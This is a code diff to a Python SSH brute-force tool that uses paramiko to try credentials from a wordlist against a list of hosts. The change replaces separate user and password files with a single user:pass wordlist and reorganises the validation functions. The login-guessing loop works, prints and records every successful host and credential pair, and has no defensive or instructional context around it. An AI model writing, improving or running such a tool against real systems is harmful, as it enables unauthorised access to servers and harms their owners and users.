@@ -18,64 +18,55 @@ def end_count():
 
 def try_ssh_bruteforce():
 	time.sleep(1)
-	op1 = open(l1,'r').readlines()
-	op2 = open(l2,'r').readlines()
-	userlist1 = []
-	passlist1 = []
+	op1 = open(l,'r').readlines()
 	global validatt 
 	validatt = []
 	global invalidatt
 	invalidatt = []
-	for i in op1:
-		userlist1.append(i)
-	for i in op2:
-		passlist1.append(i)
-	userpasstg = zip(userlist1,passlist1)
 	aclient = paramiko.client.SSHClient()
 	aclient.set_missing_host_key_policy(paramiko.AutoAddPolicy)
 	port = 22
 	for i in valid_addr_list:
-		for userl,passl in userpasstg:
-			n1 = str(userl.strip())
-			n2 = str(passl.strip())
+		for d1 in op1:
+			spl = d1.split(':')
 			try:
-				aclient.connect(i,22,n1,n2)
-				print(Fore.GREEN + 'Valid Attempt On %s:%s with %s:%s' %(i,port,n1,n2))    # < -- Requires Fixing
-				validatt.append('%s:%s - %s:%s - CON ' %(i,port,n1,n2))
+				aclient.connect(i,22,spl[0].strip(),spl[1].strip())
+				print(Fore.GREEN + 'Valid Attempt On %s:%s with %s:%s' %(i,port,spl[0],spl[1]))    # < -- Requires Fixing
+				validatt.append('%s:%s - %s:%s - CON ' %(i,port,spl[0],spl[1]))
 			except Exception:
-				print(Fore.RED + 'Invalid Attempt On %s:%s with %s:%s' %(i,port,n1,n2))
-				invalidatt.append('%s:%s - %s:%s - CONERR' %(i,port,n1,n2))
+				print(Fore.RED + 'Invalid Attempt On %s:%s with %s:%s' %(i,port,spl[0],spl[1]))
+				invalidatt.append('%s:%s - %s:%s - CONERR' %(i,port,spl[0],spl[1]))
 	time.sleep(1)
 	end_count()
-			
-def get_user_pass_list():
-	try:
-		time.sleep(1)
-		cri = 0
-		print(Fore.RED + 'Wait! We Need Your User and Pass List {Enter User List First}')
-		global l1
-		l1 = input(Fore.RED + 'ssh@thr:~$ ')
-		global l2
-		l2 = input(Fore.RED + 'ssh@thr:~$ ')
-	except KeyboardInterrupt:
-		print(Fore.RED + '|SSH_THR| - Closing.. |')
-		time.sleep(1.5)
-		exit()
+
+def collect_formatted_wordlist():
+	time.sleep(1)
+	print(Fore.RED + 'Wait! We Need Your Wordlist | Format User and Pass As Seen | (root:root) (demo:password)')
+	cri = 0
+	global l 
+	l = input('ssh@thr:~$ ')
 	fn = '.txt'
-	if fn in l1 and l2:
-		cri += 2
+	if fn in l:
+		cri += 1
 	else:
 		pass
-	for i in os.listdir(os.getcwd()):
-		if l1 and l1 == i:
-			cri += 2
-		else:
-			pass
-	if cri == 4:
-		return True 
+	if os.path.exists(os.path.abspath(l)):
+		cri += 1
+	else:
+		pass
+	if cri == 2:
+		return True
 	else:
 		return False
-		
+
+def collect_user_data():
+	if collect_formatted_wordlist():
+			print(Fore.GREEN + 'Valid Wordlist File | %s |' %(l))
+			try_ssh_bruteforce()
+	else:
+			print(Fore.RED + "List %s Invalid | List Either Doesn't Exist Or Isn't Formatted To .txt |" %(l))
+			collect_user_data()
+
 def try_addr_list_con(addr):
 	global valid_addr_list
 	valid_addr_list = []
@@ -98,20 +89,7 @@ def try_addr_list_con(addr):
 		print(Fore.GREEN + 'ADDR_LIST_STATE | Valid ADDRS: %s | Invalid ADDRS: %s | ' %(len(valid_addr_list),len(invalid_addr_list)))
 		time.sleep(1)
 		print(Fore.GREEN + 'Trying | %s | Valid ADDRS ' %(len(valid_addr_list)))
-		if get_user_pass_list():
-			print(Fore.GREEN + 'Both Lists Valid | Criteria Success | ')
-			time.sleep(0.7)
-			print(Fore.GREEN + 'Trying SSH BruteForce Using %s:%s with %s ' %(l1,l2,addrlist))
-			try_ssh_bruteforce()
-		else:
-			print(Fore.RED + 'One Or More Lists Are Invalid | Criteria Error |')
-						
-def validate_addr_list(addr):
-	fp = os.path.abspath(str(addr))
-	if os.path.exists(fp):
-		return True
-	else:
-		return False
+		collect_user_data()
 
 def enter_dir():
 	try:
@@ -138,6 +116,14 @@ def enter_dir():
 			time.sleep(1)
 			validation_second()
 	
+						
+def validate_addr_list(addr):
+	fp = os.path.abspath(str(addr))
+	if os.path.exists(fp):
+		return True
+	else:
+		return False
+
 def validation_second():
 	print(Fore.RED + 'Please Enter Your Address List, Format to .txt')
 	print(Fore.RED + "PUT THIS PY FILE IN THE DIRECTORY OF YOUR LIST OR ENTER D FOR A DIFFERENT DIR")
@@ -154,6 +140,7 @@ def validation_second():
 		print(Fore.RED + 'ADDR_LIST | %s | Is Invalid' %(addrlist))
 		time.sleep(1)
 		validation_second()
+
 
 def banner():
 	time.sleep(1)
